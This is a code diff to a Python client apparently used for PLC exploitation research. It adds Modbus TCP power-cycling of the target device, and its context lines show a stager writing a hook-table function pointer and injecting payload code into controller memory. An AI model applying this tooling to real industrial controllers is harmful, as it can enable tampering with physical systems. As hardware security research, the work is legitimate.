@@ -5,6 +5,7 @@ import subprocess
 import binascii
 
 from pwn import remote, context, log, xor
+from pymodbus.client import ModbusTcpClient
 
 context.update(log_level="info", bits=32, endian="big")
 
@@ -40,21 +41,57 @@ class PlcClient:
     def log(self, message):
         self.log_callback(message)
 
-    def connect(self, switch_power=False, ps_host='powersupply', ps_port=80, ps_delay=10):
+    def _power_cycle_http(self, ps_host, ps_port, ps_delay):
+        self.log(f"Turning off power supply via HTTP and sleeping for {ps_delay} seconds")
+        try:
+            subprocess.check_call(
+                ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "off"])
+            self.log("[+] Turned off power supply, sleeping")
+            time.sleep(ps_delay)
+            self.log("[+] Turned on power supply again")
+            subprocess.check_call(
+                ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "on"])
+            self.log("[+] Successfully turned on power supply")
+            return True
+        except (subprocess.CalledProcessError, FileNotFoundError) as e:
+            self.log(f"[!] HTTP Power switch command failed: {e}")
+            self.log("[!] Ensure 'tools/powersupply/switch_power.py' is executable.")
+            return False
+
+    def _power_cycle_modbus(self, ps_host, ps_port, ps_delay, modbus_slave_id, modbus_coil_addr):
+        self.log(f"Turning off power supply via Modbus and sleeping for {ps_delay} seconds")
+        try:
+            client = ModbusTcpClient(ps_host, port=ps_port)
+            client.connect()
+
+            self.log(f"Writing OFF to coil {modbus_coil_addr} on slave {modbus_slave_id}")
+            client.write_coil(modbus_coil_addr, False, slave=modbus_slave_id)
+
+            self.log("[+] Turned off power supply, sleeping")
+            time.sleep(ps_delay)
+
+            self.log(f"Writing ON to coil {modbus_coil_addr} on slave {modbus_slave_id}")
+            client.write_coil(modbus_coil_addr, True, slave=modbus_slave_id)
+
+            self.log("[+] Successfully turned on power supply")
+            client.close()
+            return True
+        except Exception as e:
+            self.log(f"[!] Modbus Power switch command failed: {e}")
+            return False
+
+    def connect(self, switch_power=False, ps_type="HTTP Switch", **kwargs):
         if switch_power:
-            self.log(f"Turning off power supply and sleeping for {ps_delay} seconds")
-            try:
-                subprocess.check_call(
-                    ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "off"])
-                self.log("[+] Turned off power supply, sleeping")
-                time.sleep(ps_delay)
-                self.log("[+] Turned on power supply again")
-                subprocess.check_call(
-                    ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "on"])
-                self.log("[+] Successfully turned on power supply")
-            except (subprocess.CalledProcessError, FileNotFoundError) as e:
-                self.log(f"[!] Power switch command failed: {e}")
-                self.log("[!] Ensure 'tools/powersupply/switch_power.py' is executable and configured.")
+            if ps_type == "HTTP Switch":
+                if not self._power_cycle_http(kwargs['ps_host'], kwargs['ps_port'], kwargs['ps_delay']):
+                    return False
+            elif ps_type == "Modbus TCP":
+                if not self._power_cycle_modbus(
+                    kwargs['ps_host'], kwargs['ps_port'], kwargs['ps_delay'],
+                    kwargs['modbus_slave_id'], kwargs['modbus_coil_addr']):
+                    return False
+            else:
+                self.log(f"[!] Unknown power supply type: {ps_type}")
                 return False
 
         self.log(f"Attempting to connect to {self.host}:{self.port}...")
@@ -89,8 +126,6 @@ class PlcClient:
             self.log("Saying bye...")
             try:
                 if not continue_plc:
-                    # In the original code, this was behind a raw_input,
-                    # suggesting it might be good to pause before continuing the boot.
                     self.log("Pausing before sending bye...")
                     time.sleep(1)
                 self._bye()
@@ -259,9 +294,7 @@ class PlcClient:
         add_hook_no = DEFAULT_SECOND_ADD_HOOK_IND
         tar_addr = self.next_payload_location
 
-        # Set up function pointer
         self._write_via_stager(ADD_HOOK_TABLE_START + 8 * add_hook_no, b"\x00\x00\x00\xff" + struct.pack(">I", tar_addr), stager_addhook_ind)
-        # Write payload code
         self._write_via_stager(tar_addr, payload, stager_addhook_ind)
 
         self.next_payload_location += len(payload)
@@ -330,7 +363,7 @@ class PlcClient:
             msg_buffer += msg
 
             if "enter a number" in msg:
-                choice = input_callback() # Ask GUI for input
+                choice = input_callback()
                 self._send_packet(choice.encode())
 
         self.log("[*] Game over!")
